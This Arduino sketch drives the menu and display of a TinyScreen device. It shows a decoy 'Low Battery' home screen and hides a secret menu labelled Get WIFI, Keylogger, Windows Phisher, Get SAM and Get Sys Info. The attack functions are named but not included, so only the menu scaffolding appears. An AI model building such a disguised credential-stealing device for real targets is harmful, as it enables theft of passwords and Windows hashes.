/*  This is the main file for the graphics, menu functionality and scroll program. This file includes the code
 *  for the main screen that appears when you first upload the program. 
 *  
 *  Reference from: Ben Rose and Laveréna Wienclaw
 */

#include <Wire.h>
#include "TinyScreen.h"     // might have to change to bracket to work
#include "GraphicsBuffer.h" // might have to change to bracket to work
#include "TimeLib.h"        // might have to change to bracket to work
#include <strings.h>

// DO NOT EDIT UNTIL MENU FUNCTIONALITY


GraphicsBuffer displayBuffer = GraphicsBuffer(96, 64, colorDepth16BPP);

//TinyScreen display = TinyScreen(TinyScreenPlus); // TinyScreen+
TinyScreen display = TinyScreen(TinyScreenDefault); // TinyScreen TinyShield

uint8_t menuTextY[8] = {1 * 8 - 1, 2 * 8 - 1, 3 * 8 - 1, 4 * 8 - 1, 5 * 8 - 1, 6 * 8 - 1, 7 * 8 - 3, 8 * 8 - 3};

// You can change buttons here, but you will need to change the arrow graphics elsewhere in the program to
// match what you change here 
const uint8_t upButton     = TSButtonUpperRight;
const uint8_t downButton   = TSButtonLowerRight;
const uint8_t viewButton   = TSButtonLowerRight;
const uint8_t clearButton  = TSButtonLowerRight;
const uint8_t backButton   = TSButtonUpperLeft;
const uint8_t selectButton = TSButtonLowerLeft;
const uint8_t menuButton   = TSButtonLowerLeft;

volatile uint32_t counter = 0;

uint8_t displayOn = 0;
uint8_t buttonReleased = 1;
unsigned long mainDisplayUpdateInterval = 20;
unsigned long lastMainDisplayUpdate = 0;

int brightness = 8;

const uint8_t displayStateHome = 0x01;
const uint8_t displayStateMenu = 0x02;
const uint8_t displayStateEditor = 0x03;
const uint8_t displayStateCalibration = 0x04;

uint8_t currentDisplayState = displayStateHome;

// Make Serial Monitor compatible for all TinyCircuits processors
#if defined(ARDUINO_ARCH_AVR)
  #define SerialMonitorInterface Serial
#elif defined(ARDUINO_ARCH_SAMD)
  #define SerialMonitorInterface SerialUSB
#endif

// Initialise the tiny circuit
void setup() {
  Wire.begin();
  SerialMonitorInterface.begin(200000);
  delay(100);
  
  display.begin();
  display.setFlip(true);
  display.setBitDepth(1);
  display.initDMA();  

  if (displayBuffer.begin()) {
    //memory allocation error- buffer too big
    while (1) {
      SerialMonitorInterface.println("Display buffer memory allocation error!");
      delay(1000);
    }
  }

  displayBuffer.setFont(thinPixel7_10ptFontInfo);

  displayBuffer.clear();
  
  initHomeScreen();
  requestScreenOn();
}

// keep tiny circuit on loop to read for button presses and display settings
void loop() {
  displayOn = 1;
  
  if (displayOn && (millis() > mainDisplayUpdateInterval + lastMainDisplayUpdate)) {
    lastMainDisplayUpdate = millis();
    display.endTransfer();
    display.goTo(0, 0);
    display.startData();
    display.writeBufferDMA(displayBuffer.getBuffer(), displayBuffer.getBufferSize());
  }

  if (currentDisplayState == displayStateHome) {
    if ( display.getButtons(TSButtonLowerRight) || display.getButtons(TSButtonUpperRight) || display.getButtons(TSButtonLowerLeft) || display.getButtons(TSButtonUpperLeft)){
      displayBuffer.clear();  // if a button is pressed, clear the screen
    }

    updateMainDisplay(); 
    // fakeDataDisplay(); // This is the main home screen display
    display.writeBufferDMA(displayBuffer.getBuffer(), displayBuffer.getBufferSize());
    delay (500); // Making this smaller will make the screen more scattered, making it longer will mean you need to hold in buttons longer
  } else {
    drawMenu();
  }

  checkButtons();
  updateMainDisplay();
}

// check for screen display being active
int requestScreenOn() {
  if (!displayOn) {
    setTime(counter);
    displayOn = 1;
    updateMainDisplay();
    return 1;
  }
  return 0;
}

// reads buttons when pressed
void checkButtons() {
  byte buttons = display.getButtons();
  if (buttonReleased && buttons) {
    if (displayOn) {
      buttonPress(buttons);
    }
    requestScreenOn();
    buttonReleased = 0;
  }
  if (!buttonReleased && !(buttons & 0x1F)) {
    buttonReleased = 1;
  }
}

// homepage index initialise
void initHomeScreen() {
  displayBuffer.clearWindow(0, 1, 96, 5);
  updateMainDisplay();
}


// homepage display
void updateMainDisplay() {
  updateDateTimeDisplay();
  if (currentDisplayState == displayStateHome) {
    displayBuffer.setCursor(20, menuTextY[2]);
    displayBuffer.print("Low Battery!");
    displayBuffer.setCursor(18,menuTextY[3]);
    displayBuffer.print("Please Charge!");
    // displayBuffer.setCursor(9, menuTextY[6]);
    // displayBuffer.print("Menu");
    
    // leftArrow(0, 57);
    // rightArrow(90, 57);
    
  }
}

// show date time on screen
void updateDateTimeDisplay() {
  displayBuffer.clearWindow(0, 0, 96, 8);  

  displayBuffer.setCursor(0, -1);
  displayBuffer.print("Thu 11/22");

  displayBuffer.setCursor(58, -1);
  displayBuffer.print("11:00AM");

  displayBuffer.setCursor(40, menuTextY[0]);
  displayBuffer.print("Battery: 2%");
}
// DO NOT EDIT HERE UNTIL MENU FUNCTIONALITY

//===============================================================================//
// start of menu functionality //
#define menu_debug_print true // Debug messages will print to the Serial Monitor when this is 'true'

// Change the menu font colors for fun! Pre-set color options are TS_16b_:
// Black, Gray, DarkGray, White, Blue, DarkBlue, Red, DarkRed, Green, DarkGreen, Brown, DarkBrown, Yellow
// You can make more colors in the TinyScreen library TinyScreen.h file, there are over 65000+ color combos!
uint16_t defaultFontColor = TS_16b_White;
uint16_t defaultFontBG = TS_16b_Black;
uint16_t inactiveFontColor = TS_16b_Gray;
uint16_t inactiveFontBG = TS_16b_Black;

uint8_t menuHistory[5];
uint8_t menuHistoryIndex = 0;
uint8_t menuSelectionLineHistory[5];

int currentMenu = 0;
int currentMenuLine = 0;
int lastMenuLine = -1;
int currentSelectionLine = 0;
int lastSelectionLine = -1;

void (*menuHandler)(uint8_t) = NULL;
uint8_t (*editorHandler)(uint8_t, int*, char*, void (*)()) = NULL;

// Use this struct outline to create menus
typedef struct
{
  const uint8_t amtLines; // NOTE: VALUE MUST BE MATCHED TO ARRAY OR UPLOAD ERROR
  const char* const * strings;
  void (*selectionHandler)(uint8_t);
} menu_info;

// ====================================================================================================//
// ============================================EDIT HERE===============================================//
// Start of secret menu
// Create new static array names
static const char PROGMEM menuFunction0[] = "Get WIFI";
static const char PROGMEM menuFunction1[] = "Keylogger";
static const char PROGMEM menuFunction2[] = "Windows Phisher";
static const char PROGMEM menuFunction3[] = "Get SAM";
static const char PROGMEM menuFunction4[] = "Get Sys Info";

// Add static array into menu array for display
static const char* const PROGMEM menuArr[] =
{
  menuFunction0,
  menuFunction1,
  menuFunction2,
  menuFunction3,
  menuFunction4,
};

const menu_info menuData =
{
  5, // Edit here, increase as more functions get added
  menuArr, // Do not need to edit
  secretMenu, // Do not need to edit
};
// end of menu
// ====================================================================================================//
// ============================================EDIT STOP===============================================//

//const menu_info menuList[] = {exampleMenuInfo, dateTimeMenuInfo, secondExampleMenuInfo};
const menu_info menuList[] = {menuData};
#define secretMenuIndex 0

// ====================================================================================================//
// ============================================EDIT HERE===============================================//
// Menu selections
// Create more selections to use different functions
void secretMenu(uint8_t selection) {
  if (menu_debug_print)SerialMonitorInterface.println("in main menu");
  if (selection == 0) {
    getWifi();
  }
  if (selection == 1) {
    keylogger();
  }
  if (selection == 2) {
    windowsPhisher();
  }
  if (selection == 3) {
    samDumper();
  }
  if (selection == 4) {
    getSysinfo();
  }
}
// ====================================================================================================//
// ============================================EDIT STOP===============================================//

// reads for button press on tinycircuit
void buttonPress(uint8_t buttons) {
  if (currentDisplayState == displayStateHome) {
    if (buttons == viewButton) { // TSButtonLowerRight
      // menuHandler = viewMenu;
      // newMenu(secretMenuIndex);    
      // menuHandler(0);
      
    } else if (buttons == menuButton) { // TSButtonLowerLeft
      menuHandler = viewMenu;
      newMenu(secretMenuIndex);
      menuHandler(0);
    }
  } else if (currentDisplayState == displayStateMenu || currentDisplayState == displayStateCalibration) {
    if (menuHandler) {
      menuHandler(buttons);
    }
  } else if (currentDisplayState == displayStateEditor) {
    if (editorHandler) {
      editorHandler(buttons, 0, 0, NULL);
    }
  }
}

// change to new menu
void newMenu(int8_t newIndex) {
  currentMenuLine = 0;
  lastMenuLine = -1;
  currentSelectionLine = 0;
  lastSelectionLine = -1;
  if (newIndex >= 0) {
    menuHistory[menuHistoryIndex++] = currentMenu;
    currentMenu = newIndex;
  } else {
    if (currentDisplayState == displayStateMenu) {
      menuHistoryIndex--;
      currentMenu = menuHistory[menuHistoryIndex];
    }
  }
  if (menuHistoryIndex) {
    currentDisplayState = displayStateMenu;
    if (menu_debug_print)SerialMonitorInterface.print("Change menu index to: ");
    if (menu_debug_print)SerialMonitorInterface.println(currentMenu);
    currentSelectionLine = menuSelectionLineHistory[menuHistoryIndex];
  } else {
    if (menu_debug_print)SerialMonitorInterface.print("Change menu index to: ");
    if (menu_debug_print)SerialMonitorInterface.println("home");
    menuSelectionLineHistory[menuHistoryIndex + 1] = 0;
    currentDisplayState = displayStateHome;
    initHomeScreen();
  }
}



// menu directory variables
int changeDir;
int changeEnd;
int changeStart;
int yChange;
bool needMenuDraw = true;

// display menu on tinyscreen
void drawMenu() {
  //for (int yChange = changeStart; yChange != changeEnd; yChange += changeDir) {
  if (needMenuDraw) {
    needMenuDraw = false;
    displayBuffer.clearWindow(0, 7, 96, 56);
    for (int i = 0; i < menuList[currentMenu].amtLines; i++) {
      if (i == currentSelectionLine) {
        displayBuffer.fontColor(defaultFontColor, ALPHA_COLOR);
      } else {
        displayBuffer.fontColor(inactiveFontColor, ALPHA_COLOR);
      }
      char buffer[20];
      strcpy_P(buffer, (PGM_P)pgm_read_word(&(menuList[currentMenu].strings[currentMenuLine + i])));
      SerialMonitorInterface.print(buffer);
      int width = displayBuffer.getPrintWidth(buffer);
      displayBuffer.setCursor(96 / 2 - width / 2, menuTextY[i] + 5 + yChange - (currentSelectionLine * 8) + 16);
      displayBuffer.print(buffer);
    }

    writeArrows();
  }
  if (yChange != changeEnd) {
    if (abs(yChange - changeEnd) > 5) {
      yChange += changeDir;
    }
    if (abs(yChange - changeEnd) > 3) {
      yChange += changeDir;
    }
    yChange += changeDir;
    needMenuDraw = true;
  }
  displayBuffer.fontColor(0xFFFF, ALPHA_COLOR);
}


// changes directory variables
void viewMenu(uint8_t button) {
  if (menu_debug_print)SerialMonitorInterface.print("viewMenu ");
  if (menu_debug_print)SerialMonitorInterface.println(button);
  if (!button) {

  } else {
    if (button == upButton) { // move up (TSButtonUpperRight)
      if (currentSelectionLine > 0) {
        currentSelectionLine--;
      }
    } else if (button == downButton) {  // move down (TSButtonLowerRight)
      if (currentSelectionLine < menuList[currentMenu].amtLines - 1) {
        currentSelectionLine++;
      }
    } else if (button == selectButton) { // select (TSButtonLowerLeft)
      if (menu_debug_print)SerialMonitorInterface.print("select ");
      if (menu_debug_print)SerialMonitorInterface.println(currentMenuLine + currentSelectionLine);
      menuList[currentMenu].selectionHandler(currentMenuLine + currentSelectionLine); 
    } else if (button == backButton) {
      newMenu(-1);
      if (!menuHistoryIndex)
        return;
    }
  }
  if (lastMenuLine != currentMenuLine || lastSelectionLine != currentSelectionLine) {
    if (menu_debug_print)SerialMonitorInterface.println("drawing menu ");
    if (menu_debug_print)SerialMonitorInterface.println(currentMenu);


    if (currentSelectionLine < lastSelectionLine) {
      changeDir = 1;
      changeEnd = 0;
      changeStart = -7;
    } else {
      changeDir = -1;
      changeEnd = 0;
      changeStart = 7;
    }
    if (lastSelectionLine == -1) {
      changeStart = changeEnd; //new menu, just draw once
    }
    yChange = changeStart;
    needMenuDraw = true;
  }
  lastMenuLine = currentMenuLine;
  lastSelectionLine = currentSelectionLine;
  menuSelectionLineHistory[menuHistoryIndex] = currentSelectionLine;


  displayBuffer.fontColor(0xFFFF, ALPHA_COLOR);
}


// arrows functions to print on display
void writeArrows() {
  leftArrow(0, 20 + 2);
  rightArrow(0, 45 + 5);

  upArrow(90, 20 + 2);
  downArrow(90, 45 + 4);
}


void leftArrow(int x, int y) {
  displayBuffer.drawLine(x + 2, y - 2, x + 2, y + 2, 0xFFFF);
  displayBuffer.drawLine(x + 1, y - 1, x + 1, y + 1, 0xFFFF);
  displayBuffer.drawLine(x + 0, y - 0, x + 0, y + 0, 0xFFFF);
}

void rightArrow(int x, int y) {
  displayBuffer.drawLine(x + 0, y - 2, x + 0, y + 2, 0xFFFF);
  displayBuffer.drawLine(x + 1, y - 1, x + 1, y + 1, 0xFFFF);
  displayBuffer.drawLine(x + 2, y - 0, x + 2, y + 0, 0xFFFF);
}

void upArrow(int x, int y) {
  displayBuffer.drawLine(x + 0, y - 0, x + 4, y - 0, 0xFFFF);
  displayBuffer.drawLine(x + 1, y - 1, x + 3, y - 1, 0xFFFF);
  displayBuffer.drawLine(x + 2, y - 2, x + 2, y - 2, 0xFFFF);
}

void downArrow(int x, int y) {
  displayBuffer.drawLine(x + 0, y + 0, x + 4, y + 0, 0xFFFF);
  displayBuffer.drawLine(x + 1, y + 1, x + 3, y + 1, 0xFFFF);
  displayBuffer.drawLine(x + 2, y + 2, x + 2, y + 2, 0xFFFF);
}
